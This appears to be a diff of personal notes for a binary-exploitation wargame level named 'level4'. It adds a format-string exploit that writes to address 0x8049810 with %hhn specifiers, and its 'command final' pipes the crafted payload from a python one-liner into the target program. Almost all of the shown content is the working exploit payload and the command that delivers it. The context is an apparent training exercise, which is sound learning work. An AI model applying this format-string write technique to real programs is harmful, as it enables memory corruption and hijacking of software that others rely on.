@@ -20,14 +20,20 @@ b7ff26b0___bffff734___b7fd0ff4___0___0___bffff6f8___804848d___bffff4f0___200___b
 
 Were to send 0x8049810
 
+/////Don't miss to reverse it
+
 \x08\x04\x98\x10
 \x08\x04\x98\x11
 \x08\x04\x98\x13
 \x08\x04\x98\x12
 
+///// %hhn hh = char lengh ; %n = (rtfm)
+
+".%44$hhn.%43$hhn" + "A" * (68-2) + "%41$hhn" + "A" * (85-68) + "%42$hhn" + "...\x10\x98\x04\x08\x11\x98\x04\x08\x12\x98\x04\x08\x13\x98\x04\x08"
 
 120 char (environ 30 arg)
 
+/////command final
 
 (python -c 'print ".%44$hhn.%43$hhn" + "A" * (68-2) + "%41$hhn" + "A" * (85-68) + "%42$hhn" + "...\x10\x98\x04\x08\x11\x98\x04\x08\x12\x98\x04\x08\x13\x98\x04\x08"') | ./level4
 
